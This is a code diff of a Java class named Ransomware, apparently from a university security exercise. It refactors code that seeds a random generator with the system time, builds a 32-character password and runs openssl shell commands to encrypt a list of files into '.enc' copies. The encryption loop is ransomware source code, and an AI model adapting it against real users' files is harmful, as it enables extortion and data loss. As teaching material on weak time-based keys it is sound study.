@@ -2,10 +2,7 @@ package pl.edu.cybertron.ransomware;
 
 import java.io.File;
 import java.io.FileNotFoundException;
-import java.nio.file.FileSystem;
-import java.nio.file.Files;
 import java.util.ArrayList;
-import java.util.List;
 import java.util.Random;
 
 public class Ransomware {
@@ -16,17 +13,16 @@ public class Ransomware {
         }
 
         // initialize pseudo-random generator with a seed from current system time
-        // long seed = System.currentTimeMillis();
-        long seed = 1664016331101L;
+        long seed = System.currentTimeMillis();
         System.out.println(seed);
         Random random = new Random(seed);
 
         // generate random password
         String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
         int password_length = 32;
-        String random_password = "";
+        StringBuilder random_password = new StringBuilder();
         for (int i = 0; i < password_length; ++i) {
-            random_password += characters.charAt(random.nextInt(characters.length()));
+            random_password.append(characters.charAt(random.nextInt(characters.length())));
         }
         System.out.println(random_password);
 
@@ -36,7 +32,7 @@ public class Ransomware {
         for (File file : files) {
             String path = file.getAbsolutePath();
             String new_path = path + ".enc";
-            String command = "openssl aes-256-cbc -e -salt -pbkdf2 -in \"" + path + "\" -out \"" + new_path + "\" -k \"" + random_password + "\"";
+            String command = "openssl aes-256-cbc -e -salt -pbkdf2 -in \"" + path + "\" -out \"" + new_path + "\" -k \"" + random_password.toString() + "\"";
             System.out.println(command);
 
             builder.command("sh", "-c", command);
